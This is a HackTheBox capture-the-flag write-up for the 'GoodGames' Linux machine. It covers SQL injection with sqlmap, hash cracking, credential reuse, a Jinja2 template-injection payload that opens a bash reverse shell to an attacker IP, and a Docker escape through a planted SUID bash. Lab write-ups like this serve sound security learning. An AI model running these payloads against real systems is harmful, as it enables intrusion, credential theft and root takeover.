# GoodGames — HackTheBox

| Field      | Value              |
|------------|--------------------|
| Platform   | HackTheBox         |
| OS         | Linux              |
| Difficulty | Easy               |
| Tags       | SQLi, SSTI, Docker escape, SUID, Internal network pivoting |

---

## 1. Reconnaissance

```bash
nmap -sV -sC 10.129.33.160
```

Only port 80 open — HTTP, video game community/store.

![nmap scan — port 80 only](screenshots/nmap-scan.png)

![Web homepage — GoodGames store](screenshots/web-homepage.png)

---

## 2. SQL Injection

Navigated to the login page. Captured the POST request with Burp Suite before attempting to register.

![Login page](screenshots/login-sqli-vulnerable.png)

![Burp capture of login request](screenshots/burp-capture.png)

Saved the request as `sqlfile` and ran sqlmap:

```bash
# Enumerate databases
sqlmap -r sqlfile --dbs --batch
```

![sqlmap request loaded](screenshots/sqlmap-request.png)

![sqlmap — databases found](screenshots/sqlmap-dbs.png)

```bash
# Enumerate tables
sqlmap -r sqlfile -D main --tables --batch
```

![sqlmap — tables](screenshots/sqlmap-tables.png)

```bash
# Dump credentials
sqlmap -r sqlfile -D main -T user -C "email,password" --dump --batch
```

![sqlmap — credentials dumped](screenshots/sqlmap-dump.png)

Obtained: `admin@goodgames.htb` | `2b22337f218b2d82dfc3b6f77e7cb8ec`

Cracked the MD5 hash with hashcat:

```bash
hashcat -m 0 2b22337f218b2d82dfc3b6f77e7cb8ec /usr/share/wordlists/rockyou.txt
# Result: superadministrator
```

---

## 3. Admin Panel & Internal Subdomain Discovery

Logged in as `admin` / `superadministrator`.

![Admin login](screenshots/admin-login.png)

![Admin panel](screenshots/admin-panel.png)

The dashboard had nothing interesting. Checked the **page source** of the admin profile page — found a hidden subdomain URL embedded in the source code.

```
http://internal-administration.goodgames.htb
```

![Source code revealing internal subdomain](screenshots/source-code-subdomain.png)

![Settings gear redirect](screenshots/settings-gear-redirect.png)

Added to `/etc/hosts`:

```
<IP>  goodgames.htb internal-administration.goodgames.htb
```

![/etc/hosts entry](screenshots/etc-hosts-entry.png)

Accessed the internal panel — a Flask Volt admin interface with its own login.

![Internal admin panel](screenshots/internal-admin-panel.png)

Credential reuse worked: `admin` / `superadministrator`.

![Credential reuse](screenshots/credential-reuse.png)

![Logged into internal panel](screenshots/internal-logged-in.png)

---

## 4. Server-Side Template Injection (SSTI)

The profile **Full Name** field reflected user input through a Jinja2 template engine. Tested for SSTI:

```
Detection payload: {{5*5}}
```

![SSTI detection payload](screenshots/ssti-detection.png)

![SSTI confirmed — output: 25](screenshots/ssti-confirmed.png)

Set up a netcat listener:

```bash
nc -lvp 4444
```

![Netcat listener ready](screenshots/netcat-listener.png)

Injected reverse shell payload into the Full Name field:

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/10.10.14.63/4444 0>&1"').read() }}
```

![Reverse shell payload injected](screenshots/reverse-shell-payload.png)

![RCE — reverse shell received](screenshots/rce-shell.png)

Shell landed as `root` — but inside a Docker container, not the real host.

![Docker container detected](screenshots/docker-detected.png)

### User Flag

```bash
cat /home/augustus/user.txt
```

![User flag](screenshots/user-flag.png)

---

## 5. Privilege Escalation — Docker Escape

### Step 1 — Enumerate the internal network

A `Dockerfile` was found in `/backend`, confirming Docker usage. Checked the network interface:

```bash
ip addr
# 172.19.0.2/16 — internal Docker network
```

Downloaded a static nmap binary to scan the internal network from the container:

```bash
# On Kali
python3 -m http.server 80

# On target
wget 10.10.14.63/nmap
chmod +x nmap

# Scan for live hosts
./nmap -sn 172.19.0.0/16
# Found: 172.19.0.1 (host)

# Port scan the host
./nmap 172.19.0.1 -v
# Ports open: 22 (SSH), 80 (HTTP)
```

![Static nmap — host 172.19.0.1 discovered](screenshots/nmap-static-scan.png)

### Step 2 — SSH to host as augustus

Tried the same password via SSH to the host:

```bash
ssh augustus@172.19.0.1
# password: superadministrator
```

![SSH to host as augustus](screenshots/ssh-augustus-host.png)

### Step 3 — Plant SUID bash from Docker

Augustus's home directory (`/home/augustus`) was mounted inside the Docker container. As Docker root, we could write files that would be accessible on the host with root ownership.

From the Docker root shell:

```bash
# Copy bash binary into the mounted home directory
cp /bin/bash /home/augustus/bash

# Set root ownership
chown root:root /home/augustus/bash

# Set SUID bit + full permissions
chmod 4777 /home/augustus/bash
```

![SUID bash planted with correct permissions](screenshots/bash-suid-copy.png)

**Why this works:** Augustus cannot change ownership or set SUID on the host (low-privileged user). But from Docker root, we write files with root ownership into the shared mount. The host sees the file as owned by root with SUID set — so executing it spawns a root shell.

### Step 4 — Execute SUID bash on host

Back in the augustus SSH session on the host:

```bash
./bash -p
# whoami → root
```

![Root shell on host](screenshots/root.png)

```bash
cat /root/root/root.txt
```

---

## 6. Key Takeaways

**Check page source for hidden subdomains** — the internal admin URL was only visible in the HTML source, not linked from the UI.

**Credential reuse across internal services** — any credential recovered should be tested against SSH and all web panels found.

**SSTI in Jinja2** — `{{5*5}}` confirms injection. Escalate to RCE with `os.popen(...)`. Reference: [PayloadsAllTheThings SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md)

**Docker escape via mounted home directory:**
1. Identify mounted host directories (`/home/augustus` accessible inside container)
2. SSH to host as low-priv user using reused credentials
3. From Docker root: `cp /bin/bash`, `chown root:root bash`, `chmod 4777 bash`
4. On host: `./bash -p` → root
